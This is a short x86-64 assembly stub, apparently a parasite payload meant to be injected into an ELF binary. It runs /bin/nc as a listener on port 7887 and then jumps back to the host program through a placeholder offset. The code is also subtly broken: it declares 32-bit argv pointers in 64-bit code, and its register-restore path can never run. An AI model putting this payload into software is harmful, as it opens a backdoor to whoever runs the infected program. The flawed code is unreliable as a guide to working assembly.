section .text
    global _start

time:

_start:

    push rax
    push rdi
    push rsi
    push rdx

    mov rax, 59
    lea rdi, [rel exec_file]
    lea rsi, [rel argv]
    xor rdx, rdx
    syscall

    pop rdx
    pop rsi
    pop rdi
    pop rax

    lea rax, [rel _start]
    sub rax, 0x11111111
    jmp rax

exec_file db "/bin/nc", 0x0
arg0 db "/bin/nc", 0x0
arg1 db "-l", 0x0
arg2 db "7887", 0x0
argv dd arg0, arg1, arg2, 0x0
